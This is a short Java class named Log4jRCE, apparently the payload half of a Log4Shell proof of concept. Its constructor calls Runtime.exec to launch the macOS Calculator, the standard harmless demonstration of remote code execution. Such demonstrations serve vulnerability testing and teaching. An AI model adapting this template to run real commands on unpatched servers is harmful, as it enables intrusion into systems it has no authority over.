
    public class Log4jRCE {
        public Log4jRCE(){
            try{
                Runtime.getRuntime().exec("open -a Calculator");
            } catch (Exception e){
                e.printStackTrace();
            }
        }
        public static void main(String[] argv){
            Log4jRCE e = new Log4jRCE();
        }
    }
